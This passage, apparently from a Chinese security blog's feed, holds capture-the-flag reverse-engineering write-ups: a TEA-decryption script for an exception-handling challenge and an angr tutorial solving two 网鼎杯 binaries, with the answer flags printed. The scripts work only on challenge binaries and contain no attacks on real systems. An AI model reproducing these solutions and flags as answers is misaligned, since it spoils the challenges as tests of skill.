src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228101937653.png" alt="image-20230228101937653"></p><p>触发异常后， 将[ebp+var_48] ^ 0x1234578</p><p>(点击查看[ebp+var_48]   其实就是result（记着大小端序的问题）)</p><p><img src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228102246893.png" alt="image-20230228102246893"></p><p>所以说可以写个脚本跑出值</p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span> </span><br><span class="line">tmp = <span class="number">0xde3779B9</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">sum</span> += tmp</span><br><span class="line">    tmp ^= <span class="number">0x12345678</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">sum</span> &amp; <span class="number">0xffffffff</span>), end=<span class="string">')</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[0x9E3779B9, 0x2a3aa97a, 0xc8722333, 0x547552f4, 0xF2ACCCAD, 0x7EAFFC6E, 0x1CE77627</span><br><span class="line">    , 0xA8EAA5E8, 0x47221FA1, 0xD3254F62, 0x715CC91B, 0xFD5FF8DC, 0x9B977295, 0x279AA256</span><br><span class="line">    , 0xC5D21C0F, 0x51D54BD0, 0xF00CC589, 0x7C0FF54A, 0x1A476F03, 0xA64A9EC4, 0x4482187D</span><br><span class="line">    , 0xD085483E, 0x6EBCC1F7, 0xFABFF1B8, 0x98F76B71, 0x24FA9B32, 0xC33214EB, 0x4F3544AC</span><br><span class="line">    , 0xED6CBE65, 0x796FEE26, 0x17A767DF, 0xA3AA97A0]</span><br></pre></td></tr></tbody></table></figure><p>当然 你也可以通过动调获得delta的值   就是循环后result的值</p><p>就是运行查看result的值  一直循环32次（。。。。）</p><p><img src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228102628776.png" alt="image-20230228102628776"></p><p><img src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228102736994.png" alt="image-20230228102736994"></p><p>得到delta后即可以写exp了</p><p><img src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228103218215.png" alt="image-20230228103218215"></p><p><img src="/2023/02/28/reverse-%E5%8F%8D%E8%B0%83%E8%AF%95-%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-tea/image-20230228103555171.png" alt="image-20230228103555171"></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0x88E821CE, 0x0B009D70, 0x91B1E68F, 0x0131EA96, 0xA3209D7D, 0xA9187DFB, 0xC452C5CA, 0xA9696753]</span><br></pre></td></tr></tbody></table></figure><p>EXP</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">encData = [<span class="number">0x88E821CE</span>, <span class="number">0x0B009D70</span>, <span class="number">0x91B1E68F</span>, <span class="number">0x131EA96</span>, <span class="number">0x0A3209D7D</span>, <span class="number">0x0A9187DFB</span>, <span class="number">0x0C452C5CA</span>, <span class="number">0x0A9696753</span>]</span><br><span class="line"></span><br><span class="line">cipher = [<span class="number">0x9E3779B9</span>, <span class="number">0x2a3aa97a</span>, <span class="number">0xc8722333</span>, <span class="number">0x547552f4</span>, <span class="number">0xF2ACCCAD</span>, <span class="number">0x7EAFFC6E</span>, <span class="number">0x1CE77627</span></span><br><span class="line">    , <span class="number">0xA8EAA5E8</span>, <span class="number">0x47221FA1</span>, <span class="number">0xD3254F62</span>, <span class="number">0x715CC91B</span>, <span class="number">0xFD5FF8DC</span>, <span class="number">0x9B977295</span>, <span class="number">0x279AA256</span></span><br><span class="line">    , <span class="number">0xC5D21C0F</span>, <span class="number">0x51D54BD0</span>, <span class="number">0xF00CC589</span>, <span class="number">0x7C0FF54A</span>, <span class="number">0x1A476F03</span>, <span class="number">0xA64A9EC4</span>, <span class="number">0x4482187D</span></span><br><span class="line">    , <span class="number">0xD085483E</span>, <span class="number">0x6EBCC1F7</span>, <span class="number">0xFABFF1B8</span>, <span class="number">0x98F76B71</span>, <span class="number">0x24FA9B32</span>, <span class="number">0xC33214EB</span>, <span class="number">0x4F3544AC</span></span><br><span class="line">    , <span class="number">0xED6CBE65</span>, <span class="number">0x796FEE26</span>, <span class="number">0x17A767DF</span>, <span class="number">0xA3AA97A0</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">8</span>, <span class="number">2</span>):</span><br><span class="line">    v11 = encData[i]</span><br><span class="line">    v10 = encData[i+<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v9 = cipher[<span class="number">31</span>-k]</span><br><span class="line">        v10 -= (key[<span class="number">3</span>] + (v11 &gt;&gt; <span class="number">5</span>)) ^ (v9 + v11) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v11)</span><br><span class="line">        v10 = v10 &amp; <span class="number">0xffffffff</span></span><br><span class="line">        v11 -= (key[<span class="number">1</span>] + (v10 &gt;&gt; <span class="number">5</span>)) ^ (v9 + v10) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * v10)</span><br><span class="line">        v11 = v11 &amp; <span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">        encData[i] = v11</span><br><span class="line">        encData[i + <span class="number">1</span>] = v10</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encData)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(encData[i])[<span class="number">2</span>:], end=<span class="string">','</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 33433434,31463741,41443231,37454232,34463832,35433135,30443245,38353539,</span></span><br></pre></td></tr></tbody></table></figure><p>这是大端序  转成小端序</p><p>转字符就是flag了 </p><p><code> flag{44C3A7F112DA2BE728F451C5E2D09558}</code></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单的tea加密</p><p>加上一个异常处理</p><p>异常处理不是很麻烦 </p><p>慢慢看 就好了</p><p>好的  本期结束</p><p>感谢观看</p><p>Orz Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-angr自动化技术</title>
      <link href="/2023/02/27/reverse-angr%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/02/27/reverse-angr%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>angr是一种基于z3的自动化解题技术 - 是一个用于分析二进制文件的python框架。</p><p>对逆向分析来说  是很有帮助的</p><p>当然angr可以用在逆向分析， 但不限于逆向分析</p><p>（嘎嘎  摆烂 让电脑自己去跑flag）</p><p>然后玩过z3 应该就了解这是个干嘛的了</p><p>这个的重点就是  <code>符号执行</code></p><p>项目地址 <a href="https://github.com/angr">https://github.com/angr</a></p><h2 id="符号执行"><a href="#符号执行" class="headerlink" title="符号执行"></a>符号执行</h2><p>简单来说  就是</p><p>用符号代替真实值，通过限制条件来进行路径遍历</p><p>从而找到（得到flag的路径）正确的答案</p><p>就像下面这样</p><p><img src="/2023/02/27/reverse-angr%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/image-20230227183151711.png" alt="image-20230227183151711"></p><h1 id="安装踩坑"><a href="#安装踩坑" class="headerlink" title="安装踩坑"></a>安装踩坑</h1><p>具体操作自行Google 或 BaiDu吧 Orz</p><p>简单过一下</p><ol><li>安装依赖环境</li></ol><p><code>sudo apt-get install python-dev libffi-dev build-essential virtualenvwrappe</code></p><p> 2.设置环境变量</p><p><code>export WORKON_HOME=$HOME/Python-workhome</code></p><p>和我一样就好  没啥影响</p><ol start="3"><li><p>启动服务</p><p>可以先用<code>whereis virtualenvwrapper.sh</code>找到这个在哪</p><p>然后下面 source  后边就填啥</p></li></ol><p><code>source /usr/local/bin/virtualenvwrapper.sh</code></p><ol start="4"><li><p>安装angr</p><p><code>mkvirtualenv --python=$(which python3) angr &amp;&amp; pip install angr</code></p></li></ol><p>报错的话  重复执行这条指令就好</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">ix221@TieMianSheng:~/Desktop$ mkvirtualenv --python=$(<span class="built_in">which</span> python3) angr &amp;&amp; pip install angr</span><br><span class="line">created virtual environment CPython3.8.10.final.0-64 <span class="keyword">in</span> 902ms</span><br><span class="line">  creator CPython3Posix(dest=/home/ix221/Python-workhome/angr, clear=False, no_vcs_ignore=False, global=False)</span><br><span class="line">  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/ix221/.local/share/virtualenv)</span><br><span class="line">    added seed packages: pip==23.0, setuptools==67.1.0, wheel==0.38.4</span><br><span class="line">  activators BashActivator,CShellActivator,FishActivator,NushellActivator,PowerShellActivator,PythonActivator</span><br><span class="line">Collecting angr</span><br><span class="line">  Using cached angr-9.2.39-py3-none-manylinux2014_x86_64.whl (10.5 MB)</span><br><span class="line">Collecting rpyc</span><br><span class="line">  Using cached rpyc-5.3.1-py3-none-any.whl (74 kB)</span><br><span class="line">Collecting claripy==9.2.39</span><br><span class="line">  Using cached claripy-9.2.39-py3-none-any.whl (154 kB)</span><br><span class="line">Collecting CppHeaderParser</span><br><span class="line">  Using cached CppHeaderParser-2.7.4.tar.gz (54 kB)</span><br><span class="line">  Preparing metadata (setup.py) ... <span class="keyword">done</span></span><br><span class="line">Collecting psutil</span><br><span class="line">  Using cached psutil-5.9.4-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (280 kB)</span><br><span class="line">Collecting pyvex==9.2.39</span><br><span class="line">  Downloading pyvex-9.2.39-py3-none-manylinux2014_x86_64.whl (3.0 MB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 3.0/3.0 MB 733.3 kB/s eta 0:00:00</span><br><span class="line">Collecting pycparser&gt;=2.18</span><br><span class="line">  Using cached pycparser-2.21-py2.py3-none-any.whl (118 kB)</span><br><span class="line">Collecting protobuf&gt;=3.19.0</span><br><span class="line">  Using cached protobuf-4.22.0-cp37-abi3-manylinux2014_x86_64.whl (302 kB)</span><br><span class="line">Collecting nampa</span><br><span class="line">  Using cached nampa-0.1.1-py2.py3-none-any.whl (9.2 kB)</span><br><span class="line">Collecting itanium-demangler</span><br><span class="line">  Using cached itanium_demangler-1.1-py3-none-any.whl (8.8 kB)</span><br><span class="line">Collecting cle==9.2.39</span><br><span class="line">  Using cached cle-9.2.39-py3-none-any.whl (170 kB)</span><br><span class="line">Collecting networkx!=2.8.1,&gt;=2.0</span><br><span class="line">  Using cached networkx-3.0-py3-none-any.whl (2.0 MB)</span><br><span class="line">Collecting sympy</span><br><span class="line">  Using cached sympy-1.11.1-py3-none-any.whl (6.5 MB)</span><br><span class="line">Collecting sortedcontainers</span><br><span class="line">  Using cached sortedcontainers-2.4.0-py2.py3-none-any.whl (29 kB)</span><br><span class="line">Collecting unicorn==2.0.1.post1</span><br><span class="line">  Using cached unicorn-2.0.1.post1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (16.1 MB)</span><br><span class="line">Collecting mulpyplexer</span><br><span class="line">  Using cached mulpyplexer-0.09.tar.gz (2.8 kB)</span><br><span class="line">  Preparing metadata (setup.py) ... <span class="keyword">done</span></span><br><span class="line">Collecting dpkt</span><br><span class="line">  Using cached dpkt-1.9.8-py3-none-any.whl (194 kB)</span><br><span class="line">Collecting archinfo==9.2.39</span><br><span class="line">  Using cached archinfo-9.2.39-py3-none-any.whl (57 kB)</span><br><span class="line">Collecting cachetools</span><br><span class="line">  Using cached cachetools-5.3.0-py3-none-any.whl (9.3 kB)</span><br><span class="line">Collecting GitPython</span><br><span class="line">  Using cached GitPython-3.1.31-py3-none-any.whl (184 kB)</span><br><span class="line">Collecting progressbar2&gt;=3</span><br><span class="line">  Using cached progressbar2-4.2.0-py2.py3-none-any.whl (27 kB)</span><br><span class="line">Collecting cffi&gt;=1.14.0</span><br><span class="line">  Using cached cffi-1.15.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (442 kB)</span><br><span class="line">Collecting ailment==9.2.39</span><br><span class="line">  Using cached ailment-9.2.39-py3-none-any.whl (23 kB)</span><br><span class="line">Collecting capstone!=5.0.0rc2,&gt;=3.0.5rc2</span><br><span class="line">  Using cached capstone-4.0.2-py2.py3-none-manylinux1_x86_64.whl (2.1 MB)</span><br><span class="line">Collecting decorator</span><br><span class="line">  Downloading decorator-5.1.1-py3-none-any.whl (9.1 kB)</span><br><span class="line">Collecting pysmt&gt;=0.9.5</span><br><span class="line">  Downloading PySMT-0.9.5-py2.py3-none-any.whl (319 kB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 319.1/319.1 kB 1.8 MB/s eta 0:00:00</span><br><span class="line">Collecting z3-solver==4.10.2.0</span><br><span class="line">  Downloading z3_solver-4.10.2.0-py2.py3-none-manylinux1_x86_64.whl (52.9 MB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 52.9/52.9 MB 4.2 MB/s eta 0:00:00</span><br><span class="line">Collecting pyelftools&gt;=0.27</span><br><span class="line">  Using cached pyelftools-0.29-py2.py3-none-any.whl (174 kB)</span><br><span class="line">Collecting pefile</span><br><span class="line">  Downloading pefile-2023.2.7-py3-none-any.whl (71 kB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 71.8/71.8 kB 4.7 MB/s eta 0:00:00</span><br><span class="line">Collecting bitstring</span><br><span class="line">  Downloading bitstring-4.0.1-py3-none-any.whl (45 kB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 45.6/45.6 kB 3.7 MB/s eta 0:00:00</span><br><span class="line">Collecting python-utils&gt;=3.0.0</span><br><span class="line">  Downloading python_utils-3.5.2-py2.py3-none-any.whl (24 kB)</span><br><span class="line">Collecting ply</span><br><span class="line">  Downloading ply-3.11-py2.py3-none-any.whl (49 kB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 49.6/49.6 kB 6.4 MB/s eta 0:00:00</span><br><span class="line">Collecting gitdb&lt;5,&gt;=4.0.1</span><br><span class="line">  Downloading gitdb-4.0.10-py3-none-any.whl (62 kB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 62.7/62.7 kB 2.6 MB/s eta 0:00:00</span><br><span class="line">Collecting future</span><br><span class="line">  Downloading future-0.18.3.tar.gz (840 kB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 840.9/840.9 kB 9.1 MB/s eta 0:00:00</span><br><span class="line">  Preparing metadata (setup.py) ... <span class="keyword">done</span></span><br><span class="line">Collecting plumbum</span><br><span class="line">  Using cached plumbum-1.8.1-py3-none-any.whl (126 kB)</span><br><span class="line">Collecting mpmath&gt;=0.19</span><br><span class="line">  Downloading mpmath-1.2.1-py3-none-any.whl (532 kB)</span><br><span class="line">     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 532.6/532.6 kB 8.4 MB/s eta 0:00:00</span><br><span class="line">Collecting smmap&lt;6,&gt;=3.0.1</span><br><span class="line">  Downloading smmap-5.0.0-py3-none-any.whl (24 kB)</span><br><span class="line">Building wheels <span class="keyword">for</span> collected packages: CppHeaderParser, mulpyplexer, future</span><br><span class="line">  Building wheel <span class="keyword">for</span> CppHeaderParser (setup.py) ... <span class="keyword">done</span></span><br><span class="line">  Created wheel <span class="keyword">for</span> CppHeaderParser: filename=CppHeaderParser-2.7.4-py3-none-any.whl size=44979 sha256=20962a961caf0de2c40744ba31b9f86fcf27005fb134442aa7e756cff66c96c2</span><br><span class="line">  Stored <span class="keyword">in</span> directory: /home/ix221/.cache/pip/wheels/7d/f0/ee/af6e3d91d8ef23c0496fb78df6d17e73f037da4fcabf68b273</span><br><span class="line">  Building wheel <span class="keyword">for</span> mulpyplexer (setup.py) ... <span class="keyword">done</span></span><br><span class="line">  Created wheel <span class="keyword">for</span> mulpyplexer: filename=mulpyplexer-0.9-py3-none-any.whl size=3777 sha256=925b6640e6acdc7e4a17b5ef05bc1c9561db143bb2c698d7dc75fd2cff327dc8</span><br><span class="line">  Stored <span class="keyword">in</span> directory: /home/ix221/.cache/pip/wheels/bd/60/29/0201c20e9b8d877d9384f64ca2ad9e7436015b8ddcac568085</span><br><span class="line">  Building wheel <span class="keyword">for</span> future (setup.py) ... <span class="keyword">done</span></span><br><span class="line">  Created wheel <span class="keyword">for</span> future: filename=future-0.18.3-py3-none-any.whl size=492025 sha256=e0a8a61a4fe0fb57a8d0304312ca8671e6864c5d64ef7d658ab187fca558db56</span><br><span class="line">  Stored <span class="keyword">in</span> directory: /home/ix221/.cache/pip/wheels/a0/0b/ee/e6994fadb42c1354dcccb139b0bf2795271bddfe6253ccdf11</span><br><span class="line">Successfully built CppHeaderParser mulpyplexer future</span><br><span class="line">Installing collected packages: z3-solver, unicorn, sortedcontainers, pysmt, pyelftools, ply, mulpyplexer, mpmath, itanium-demangler, dpkt, sympy, smmap, python-utils, pycparser, psutil, protobuf, plumbum, pefile, networkx, future, decorator, CppHeaderParser, capstone, cachetools, bitstring, archinfo, ailment, rpyc, progressbar2, nampa, gitdb, claripy, cffi, pyvex, GitPython, cle, angr</span><br><span class="line">Successfully installed CppHeaderParser-2.7.4 GitPython-3.1.31 ailment-9.2.39 angr-9.2.39 archinfo-9.2.39 bitstring-4.0.1 cachetools-5.3.0 capstone-4.0.2 cffi-1.15.1 claripy-9.2.39 cle-9.2.39 decorator-5.1.1 dpkt-1.9.8 future-0.18.3 gitdb-4.0.10 itanium-demangler-1.1 mpmath-1.2.1 mulpyplexer-0.9 nampa-0.1.1 networkx-3.0 pefile-2023.2.7 plumbum-1.8.1 ply-3.11 progressbar2-4.2.0 protobuf-4.22.0 psutil-5.9.4 pycparser-2.21 pyelftools-0.29 pysmt-0.9.5 python-utils-3.5.2 pyvex-9.2.39 rpyc-5.3.1 smmap-5.0.0 sortedcontainers-2.4.0 sympy-1.11.1 unicorn-2.0.1.post1 z3-solver-4.10.2.0</span><br><span class="line"></span><br><span class="line">[notice] A new release of pip is available: 23.0 -&gt; 23.0.1</span><br><span class="line">[notice] To update, run: pip install --upgrade pip</span><br><span class="line">(angr)</span><br></pre></td></tr></tbody></table></figure><p>如上就算安装好了</p><ol start="5"><li>测试</li></ol><p>安装成功后的回显 </p><p><img src="/2023/02/27/reverse-angr%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/image-20230227183404554.png" alt="image-20230227183404554"></p><h2 id="基础语句"><a href="#基础语句" class="headerlink" title="基础语句"></a>基础语句</h2><blockquote><p>切换到angr环境：workon angr</p><p>退出angr环境：deactivate</p><p><code>export WORKON_HOME=$HOME/Python-workhome</code></p><p><code>source /home/ix221/.local/bin/virtualenvwrapper.sh</code></p></blockquote><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">p=angr.Project(<span class="string">'./r100'</span>,auto_load_libs=False)<span class="comment">#加载二进制程序</span></span><br><span class="line">state=p.factory.entry_state()<span class="comment">#创建一个状态，默认为程序的入口地址</span></span><br><span class="line">simgr=p.factory.simgr(state)<span class="comment">#创建一个模拟器用来模拟程序执行</span></span><br><span class="line">res=simgr.explore(find=0x400844,avoid=0x400855)<span class="comment">#约束执行的流程，0x400844为打印nice附近的地址，0x400855附近即为打印错误的地址</span></span><br><span class="line"><span class="built_in">print</span> (res.found[0].posix.dumps(0))<span class="comment">#打印found的第一个结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显而易见 很好看懂</span></span><br></pre></td></tr></tbody></table></figure><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>根据两个回显  一个成功 一个失败</p><p>就可以试试用angr跑跑</p><h2 id="1、2018-网鼎杯线上赛第二场-Reverse-的-Martricks"><a href="#1、2018-网鼎杯线上赛第二场-Reverse-的-Martricks" class="headerlink" title="1、2018 网鼎杯线上赛第二场 Reverse 的 Martricks"></a>1、2018 网鼎杯线上赛第二场 Reverse 的 Martricks</h2><p>贴ida64 c代码</p><p><img src="/2023/02/27/reverse-angr%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/image-20230227185230041.png" alt="image-20230227185230041"></p><p><img src="/2023/02/27/reverse-angr%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/image-20230227185313487.png" alt="image-20230227185313487"></p><p>按F5 然后space</p><p>找到那两个字符串  </p><p><img src="/2023/02/27/reverse-angr%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/image-20230227185424125.png" alt="image-20230227185424125"></p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p=angr.Project(<span class="string">'./martricks'</span>,auto_load_libs=<span class="literal">False</span>)<span class="comment">#加载二进制程序</span></span><br><span class="line">state=p.factory.entry_state()<span class="comment">#创建一个状态，默认为程序的入口地址</span></span><br><span class="line">simgr=p.factory.simgr(state)<span class="comment">#创建一个模拟器用来模拟程序执行</span></span><br><span class="line">res=simgr.explore(find=<span class="number">0x400A84</span>,avoid=<span class="number">0x400A90</span>)</span><br><span class="line"><span class="built_in">print</span>(res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))<span class="comment">#打印found的第一个结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag{Everyth1n_th4t_kill5_m3_m4kes_m3_fee1_aliv3}</span></span><br></pre></td></tr></tbody></table></figure><p><img src="/2023/02/27/reverse-angr%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8A%80%E6%9C%AF/image-20230227190751839.png" alt="image-20230227190751839"></p><h2 id="2、-网鼎杯-2020-青龙组-singal"><a href="#2、-网鼎杯-2020-青龙组-singal" class="headerlink" title="2、[网鼎杯 2020 青龙组]singal"></a>2、[网鼎杯 2020 青龙组]singal</h2><p>这道题是个vm逆向  有很多方法可以做出来</p><p>我最开始是动调 找每个case的具体算法做的</p><p>做了一天。。。。。（菜菜求带带）</p><p>具体做法请大佬们去Google 或 Baidu吧 Orz</p><p>Orz</p><p>然后这儿就记录一下怎么用angr来解题吧</p><p><code>其实就是因为这道题而学的angr  哈哈哈哈</code></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p=angr.Project(<span class="string">'signal.exe'</span>,auto_load_libs=<span class="literal">False</span>)<span class="comment">#加载二进制程序</span></span><br><span class="line">state=p.factory.entry_state()<span class="comment">#创建一个状态，默认为程序的入口地址</span></span><br><span class="line">simgr=p.factory.simgr(state)<span class="comment">#创建一个模拟器用来模拟程序执行</span></span><br><span class="line">res=simgr.explore(find=<span class="number">0x40175E</span>,avoid=<span class="number">0x4016E6</span>)</span><br><span class="line"><span class="built_in">print</span>(res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))<span class="comment">#打印found的第一个结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag{757515121f3d478}</span></span><br></pre></td></tr></tbody></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>好用极了  </p><p>good good  very good</p><p>好的  本期结束</p><p>感谢观看</p><p>Orz Orz</p></body></html>]]></content>
      
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>reverse-hash暴破实例</title>
      <link href="/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/"/>
      <url>/2023/02/25/reverse-hash%E6%9A%B4%E7%A0%B4%E5%AE%9E%E4%BE%8B/</url>
      
